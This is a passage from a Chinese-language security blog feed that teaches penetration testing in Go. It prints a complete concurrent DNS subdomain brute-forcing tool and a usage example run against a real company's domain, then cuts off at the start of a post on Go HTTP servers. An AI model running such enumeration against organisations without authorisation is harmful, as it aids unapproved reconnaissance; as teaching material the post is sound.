href="http://www.abc.com的解析和www.cba.com同步起来,如果是共享ip的主机,不绑定还是访问不到网站内容.这就是为什么如果你设置cname到你的新浪sae域名,如果sae没有将你和他绑定你还是访问不了他的原因./">www.abc.com的解析和www.cba.com同步起来，如果是共享ip的主机，不绑定还是访问不到网站内容。这就是为什么如果你设置cname到你的新浪sae域名，如果sae没有将你和他绑定你还是访问不了他的原因。</a></p></blockquote><h3 id="4-查询A记录和CNAME记录"><a href="#4-查询A记录和CNAME记录" class="headerlink" title="4. 查询A记录和CNAME记录"></a>4. 查询A记录和CNAME记录</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">lookupA</span><span class="params">(fqdn, serverAddr <span class="type">string</span>)</span></span> ([]<span class="type">string</span>, <span class="type">error</span>) &#123;</span><br><span class="line"><span class="keyword">var</span> m dns.Msg</span><br><span class="line"><span class="keyword">var</span> ips []<span class="type">string</span></span><br><span class="line">m.SetQuestion(dns.Fqdn(fqdn), dns.TypeA)</span><br><span class="line">in, err := dns.Exchange(&amp;m, serverAddr)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> ips, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(in.Answer) &lt; <span class="number">1</span> &#123;</span><br><span class="line"><span class="keyword">return</span> ips, errors.New(<span class="string">&quot;no answer&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> _, answer := <span class="keyword">range</span> in.Answer &#123;</span><br><span class="line"><span class="keyword">if</span> a, ok := answer.(*dns.A); ok &#123;</span><br><span class="line">ips = <span class="built_in">append</span>(ips, a.A.String())</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ips, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">lookupCNAME</span><span class="params">(fqdn, serverAddr <span class="type">string</span>)</span></span> ([]<span class="type">string</span>, <span class="type">error</span>) &#123;</span><br><span class="line"><span class="keyword">var</span> m dns.Msg</span><br><span class="line"><span class="keyword">var</span> fqdns []<span class="type">string</span></span><br><span class="line">m.SetQuestion(dns.Fqdn(fqdn), dns.TypeCNAME)</span><br><span class="line">in, err := dns.Exchange(&amp;m, serverAddr)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> fqdns, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(in.Answer) &lt; <span class="number">1</span> &#123;</span><br><span class="line"><span class="keyword">return</span> fqdns, errors.New(<span class="string">&quot;no answer&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> _, answer := <span class="keyword">range</span> in.Answer &#123;</span><br><span class="line"><span class="keyword">if</span> c, ok := answer.(*dns.CNAME); ok &#123;</span><br><span class="line">fqdns = <span class="built_in">append</span>(fqdns, c.Target)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> fqdns, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>CNAME 记录一个FQDN指向另一个FQDN作为自己的别名。假如<code>example.com</code>组织的所有者希望通过wordpress托管来托管 wordpress网站。该服务可能有上百种ip，用于平衡其所有用户的站点，因此不可能提供单个的IP地址。wordpress可能为<code>example.com</code>提供一个CNAME，因此，<code>example.com</code>的<code>CNAME</code>可能指向<code>someserver.hostingcompany.org</code>，而CNAME的A记录则指向一个IP地址，这允许<code>example.com</code>的所有者将其站点托管再没有IP信息的服务器上面。</p><p>因此，我们需要追踪CNAME的痕迹，才能找到最有效的A记录。</p></blockquote><p>接下来我们定义lookup方法来使用CNAME追踪A记录</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">lookup</span><span class="params">(fqdn, serverAddr <span class="type">string</span>)</span></span> []result &#123;</span><br><span class="line"><span class="keyword">var</span> results []result</span><br><span class="line"><span class="keyword">var</span> cfqdn = fqdn <span class="comment">// Don&#x27;t modify the original.</span></span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">cnames, err := lookupCNAME(cfqdn, serverAddr)</span><br><span class="line"><span class="keyword">if</span> err == <span class="literal">nil</span> &amp;&amp; <span class="built_in">len</span>(cnames) &gt; <span class="number">0</span> &#123;</span><br><span class="line">cfqdn = cnames[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">continue</span> <span class="comment">// We have to process the next CNAME.</span></span><br><span class="line">&#125;</span><br><span class="line">ips, err := lookupA(cfqdn, serverAddr)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">break</span> <span class="comment">// There are no A records for this hostname.</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> _, ip := <span class="keyword">range</span> ips &#123;</span><br><span class="line">results = <span class="built_in">append</span>(results, result&#123;IPAddress: ip, Hostname: fqdn&#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span> <span class="comment">// We have processed all the results.</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> results</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>通过循环一直找到解析的末尾，从而跟踪CNAME的痕迹。</p><h3 id="5-工人函数"><a href="#5-工人函数" class="headerlink" title="5. 工人函数"></a>5. 工人函数</h3><p>我们要实现高并发，需要将工作分配给工人函数。</p><p>我们创建<code>worker()</code>函数，该函数使用三个通道函数，一个用于通知工人是否已经关闭通道，一个用于接受工作通道，一个用于发送结果。该函数还需要一个参数来指定要使用的DNS服务器</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">type</span> empty <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">worker</span><span class="params">(tracker <span class="keyword">chan</span> empty, fqdns <span class="keyword">chan</span> <span class="type">string</span>, gather <span class="keyword">chan</span> []result, serverAddr <span class="type">string</span>)</span></span> &#123;</span><br><span class="line"><span class="keyword">for</span> fqdn := <span class="keyword">range</span> fqdns &#123;<span class="comment">//在域通道上进行循环</span></span><br><span class="line">results := lookup(fqdn, serverAddr)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(results) &gt; <span class="number">0</span> &#123;</span><br><span class="line">gather &lt;- results</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> e empty</span><br><span class="line">tracker &lt;- e</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在引入函数<code>worker()</code>之前，我们需要定义一个名为<code>empty</code>的结构体，当工人完成工作时，进行跟踪记录。</p><p>在有结果的时候，发送到<code>gather</code>通道。 最后，当所有的工作完成的时候，在通道<code>tracker</code>上发送一个空结构体，表示所有工作都已完成。如果不这样做，将会使得处于竞争状态，因为调用者可能在收到结果之前退出。</p><p>之后，我们设置要传递的通道</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> results []result</span><br><span class="line">fqdns := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">string</span>, *flWorkerCount)</span><br><span class="line">gather := <span class="built_in">make</span>(<span class="keyword">chan</span> []result)</span><br><span class="line">tracker := <span class="built_in">make</span>(<span class="keyword">chan</span> empty)</span><br></pre></td></tr></table></figure><h3 id="6-使用-bufio包进行一个文本扫描器"><a href="#6-使用-bufio包进行一个文本扫描器" class="headerlink" title="6. 使用 bufio包进行一个文本扫描器"></a>6. 使用 bufio包进行一个文本扫描器</h3><p>打开文件之后，使用<code>bufio</code>包创建一个新的<code>Scanner</code>，该文本扫描器允许我们一行行的读</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">fh, err := os.Open(*flWordlist)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> fh.Close()</span><br><span class="line">scanner := bufio.NewScanner(fh)</span><br></pre></td></tr></table></figure><p>我们使用新的文本扫描器从用户提供的<code>wordlist</code>中抓取一行文本，并通过文本和用户提供的域结合在一起，组成信的<code>FQDN</code>,需要将结果发送到<code>fqdns</code>通道，但首先需要启动工人函数</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; *flWorkerCount; i++ &#123;</span><br><span class="line"><span class="keyword">go</span> worker(tracker, fqdns, gather, *flServerAddr)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> scanner.Scan() &#123;</span><br><span class="line">fqdns &lt;- fmt.Sprintf(<span class="string">&quot;%s.%s&quot;</span>, scanner.Text(), *flDomain)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="7-收集和显示结果"><a href="#7-收集和显示结果" class="headerlink" title="7. 收集和显示结果"></a>7. 收集和显示结果</h3><p>首先启动一个匿名的<code>gorountine</code>，它将收集工人的结果</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">for</span> r := <span class="keyword">range</span> gather &#123;</span><br><span class="line">results = <span class="built_in">append</span>(results, r...)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> e empty</span><br><span class="line">tracker &lt;- e</span><br><span class="line">&#125;()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>通过遍历通道<code>gather</code>，可以将接收到的结果，添加到切片<code>result</code>上，由于需要将切片附加到另一个切片上，所以需要<code>...</code>，之后关闭通道。</p><p>剩下的就是关闭通道，并且展现结果</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">close</span>(fqdns)</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; *flWorkerCount; i++ &#123;</span><br><span class="line">&lt;-tracker</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">close</span>(gather)</span><br><span class="line">&lt;-tracker</span><br></pre></td></tr></table></figure><p>此时结果尚未呈现给用户，我们需要将其打印</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">w := tabwriter.NewWriter(os.Stdout, <span class="number">0</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="string">&#x27; &#x27;</span>, <span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> _, r := <span class="keyword">range</span> results &#123;</span><br><span class="line">fmt.Fprintf(w, <span class="string">&quot;%s\t%s\n&quot;</span>, r.Hostname, r.IPAddress)</span><br><span class="line">&#125;</span><br><span class="line">w.Flush()</span><br></pre></td></tr></table></figure><h3 id="8-完整程序"><a href="#8-完整程序" class="headerlink" title="8. 完整程序"></a>8. 完整程序</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;bufio&quot;</span></span><br><span class="line"><span class="string">&quot;errors&quot;</span></span><br><span class="line"><span class="string">&quot;flag&quot;</span></span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;os&quot;</span></span><br><span class="line"><span class="string">&quot;text/tabwriter&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;github.com/miekg/dns&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">lookupA</span><span class="params">(fqdn, serverAddr <span class="type">string</span>)</span></span> ([]<span class="type">string</span>, <span class="type">error</span>) &#123;</span><br><span class="line"><span class="keyword">var</span> m dns.Msg</span><br><span class="line"><span class="keyword">var</span> ips []<span class="type">string</span></span><br><span class="line">m.SetQuestion(dns.Fqdn(fqdn), dns.TypeA)</span><br><span class="line">in, err := dns.Exchange(&amp;m, serverAddr)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> ips, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(in.Answer) &lt; <span class="number">1</span> &#123;</span><br><span class="line"><span class="keyword">return</span> ips, errors.New(<span class="string">&quot;no answer&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> _, answer := <span class="keyword">range</span> in.Answer &#123;</span><br><span class="line"><span class="keyword">if</span> a, ok := answer.(*dns.A); ok &#123;</span><br><span class="line">ips = <span class="built_in">append</span>(ips, a.A.String())</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> ips, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">lookupCNAME</span><span class="params">(fqdn, serverAddr <span class="type">string</span>)</span></span> ([]<span class="type">string</span>, <span class="type">error</span>) &#123;</span><br><span class="line"><span class="keyword">var</span> m dns.Msg</span><br><span class="line"><span class="keyword">var</span> fqdns []<span class="type">string</span></span><br><span class="line">m.SetQuestion(dns.Fqdn(fqdn), dns.TypeCNAME)</span><br><span class="line">in, err := dns.Exchange(&amp;m, serverAddr)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> fqdns, err</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(in.Answer) &lt; <span class="number">1</span> &#123;</span><br><span class="line"><span class="keyword">return</span> fqdns, errors.New(<span class="string">&quot;no answer&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> _, answer := <span class="keyword">range</span> in.Answer &#123;</span><br><span class="line"><span class="keyword">if</span> c, ok := answer.(*dns.CNAME); ok &#123;</span><br><span class="line">fqdns = <span class="built_in">append</span>(fqdns, c.Target)</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> fqdns, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">lookup</span><span class="params">(fqdn, serverAddr <span class="type">string</span>)</span></span> []result &#123;</span><br><span class="line"><span class="keyword">var</span> results []result</span><br><span class="line"><span class="keyword">var</span> cfqdn = fqdn <span class="comment">// Don&#x27;t modify the original.</span></span><br><span class="line"><span class="keyword">for</span> &#123;</span><br><span class="line">cnames, err := lookupCNAME(cfqdn, serverAddr)</span><br><span class="line"><span class="keyword">if</span> err == <span class="literal">nil</span> &amp;&amp; <span class="built_in">len</span>(cnames) &gt; <span class="number">0</span> &#123;</span><br><span class="line">cfqdn = cnames[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">continue</span> <span class="comment">// We have to process the next CNAME.</span></span><br><span class="line">&#125;</span><br><span class="line">ips, err := lookupA(cfqdn, serverAddr)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">break</span> <span class="comment">// There are no A records for this hostname.</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> _, ip := <span class="keyword">range</span> ips &#123;</span><br><span class="line">results = <span class="built_in">append</span>(results, result&#123;IPAddress: ip, Hostname: fqdn&#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">break</span> <span class="comment">// We have processed all the results.</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> results</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">worker</span><span class="params">(tracker <span class="keyword">chan</span> empty, fqdns <span class="keyword">chan</span> <span class="type">string</span>, gather <span class="keyword">chan</span> []result, serverAddr <span class="type">string</span>)</span></span> &#123;</span><br><span class="line"><span class="keyword">for</span> fqdn := <span class="keyword">range</span> fqdns &#123;</span><br><span class="line">results := lookup(fqdn, serverAddr)</span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(results) &gt; <span class="number">0</span> &#123;</span><br><span class="line">gather &lt;- results</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> e empty</span><br><span class="line">tracker &lt;- e</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> empty <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> result <span class="keyword">struct</span> &#123;</span><br><span class="line">IPAddress <span class="type">string</span></span><br><span class="line">Hostname  <span class="type">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">var</span>(</span><br><span class="line">flDomain = flag.String(<span class="string">&quot;domain&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;要猜解的域名&quot;</span>)</span><br><span class="line">flWordlist = flag.String(<span class="string">&quot;wordlist&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;猜解所使用的字典&quot;</span>)</span><br><span class="line">flWorkerCount = flag.Int(<span class="string">&quot;c&quot;</span>,<span class="number">100</span>,<span class="string">&quot;所使用的线程&quot;</span>)</span><br><span class="line">flServerAddr = flag.String(<span class="string">&quot;Server&quot;</span>,<span class="string">&quot;8.8.8.8:53&quot;</span>,<span class="string">&quot;所使用的DNS服务器&quot;</span>)</span><br><span class="line">)</span><br><span class="line">flag.Parse()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> *flDomain == <span class="string">&quot;&quot;</span> || *flWordlist == <span class="string">&quot;&quot;</span> &#123;</span><br><span class="line">fmt.Println(<span class="string">&quot;-domain and -wordlist are required&quot;</span>)</span><br><span class="line">os.Exit(<span class="number">1</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> results []result</span><br><span class="line"></span><br><span class="line">fqdns := <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="type">string</span>, *flWorkerCount)</span><br><span class="line">gather := <span class="built_in">make</span>(<span class="keyword">chan</span> []result)</span><br><span class="line">tracker := <span class="built_in">make</span>(<span class="keyword">chan</span> empty)</span><br><span class="line"></span><br><span class="line">fh, err := os.Open(*flWordlist)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="built_in">panic</span>(err)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">defer</span> fh.Close()</span><br><span class="line">scanner := bufio.NewScanner(fh)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; *flWorkerCount; i++ &#123;</span><br><span class="line"><span class="keyword">go</span> worker(tracker, fqdns, gather, *flServerAddr)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line"><span class="keyword">for</span> r := <span class="keyword">range</span> gather &#123;</span><br><span class="line">results = <span class="built_in">append</span>(results, r...)</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> e empty</span><br><span class="line">tracker &lt;- e</span><br><span class="line">&#125;()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> scanner.Scan() &#123;</span><br><span class="line">fqdns &lt;- fmt.Sprintf(<span class="string">&quot;%s.%s&quot;</span>, scanner.Text(), *flDomain)</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Note: We could check scanner.Err() here.</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">close</span>(fqdns)</span><br><span class="line"><span class="keyword">for</span> i := <span class="number">0</span>; i &lt; *flWorkerCount; i++ &#123;</span><br><span class="line">&lt;-tracker</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">close</span>(gather)</span><br><span class="line">&lt;-tracker</span><br><span class="line"></span><br><span class="line">w := tabwriter.NewWriter(os.Stdout, <span class="number">0</span>, <span class="number">8</span>, <span class="number">4</span>, <span class="string">&#x27; &#x27;</span>, <span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> _, r := <span class="keyword">range</span> results &#123;</span><br><span class="line">fmt.Fprintf(w, <span class="string">&quot;%s\t%s\n&quot;</span>, r.Hostname, r.IPAddress)</span><br><span class="line">&#125;</span><br><span class="line">w.Flush()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="9-使用"><a href="#9-使用" class="headerlink" title="9. 使用"></a>9. 使用</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">go</span> run .\main.<span class="keyword">go</span> -domain microsoft -wordlist namelist.txt -c <span class="number">1000</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/h0ld1rs/image/image/20220305110557.png"></p><h2 id="0x02-自己编写DNS服务器"><a href="#0x02-自己编写DNS服务器" class="headerlink" title="0x02 自己编写DNS服务器"></a>0x02 自己编写DNS服务器</h2><h3 id="1-实验环境搭建"><a href="#1-实验环境搭建" class="headerlink" title="1. 实验环境搭建"></a>1. 实验环境搭建</h3><p>在服务器上，这里选择使用<code>ubuntu</code>，安装好<code>docker</code></p><hr><p>先鸽一会，有点难，返回来学习</p>]]></content>
    
    
    <summary type="html">Go渗透测试中对于DNS的利用</summary>
    
    
    
    <category term="Go" scheme="https://h0ld1rs.github.io/categories/Go/"/>
    
    
    <category term="Golang" scheme="https://h0ld1rs.github.io/tags/Golang/"/>
    
  </entry>
  
  <entry>
    <title>Go渗透测试笔记(四)</title>
    <link href="https://h0ld1rs.github.io/posts/13916.html"/>
    <id>https://h0ld1rs.github.io/posts/13916.html</id>
    <published>2022-03-02T03:46:28.000Z</published>
    <updated>2022-03-23T14:25:00.699Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Go渗透测试笔记-四-–HTTP服务器，路由，中间件"><a href="#Go渗透测试笔记-四-–HTTP服务器，路由，中间件" class="headerlink" title="Go渗透测试笔记(四)–HTTP服务器，路由，中间件"></a>Go渗透测试笔记(四)–HTTP服务器，路由，中间件</h1><h2 id="0x00-HTTP服务器基础"><a href="#0x00-HTTP服务器基础" class="headerlink" title="0x00 HTTP服务器基础"></a>0x00 HTTP服务器基础</h2><h3 id="1-构建一个简单的服务器"><a href="#1-构建一个简单的服务器" class="headerlink" title="1. 构建一个简单的服务器"></a>1. 构建一个简单的服务器</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;fmt&quot;</span></span><br><span class="line"><span class="string">&quot;net/http&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">hello</span><span class="params">(w http.ResponseWriter,r * http.Request)</span></span>&#123;</span><br><span class="line">fmt.Fprintf(w,<span class="string">&quot;Hello %s \n&quot;</span>,r.URL.Query().Get(<span class="string">&quot;name&quot;</span>))</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">http.HandleFunc(<span class="string">&quot;/hello&quot;</span>,hello)</span><br><span class="line">http.ListenAndServe(<span class="string">&quot;:8000&quot;</span>,<span 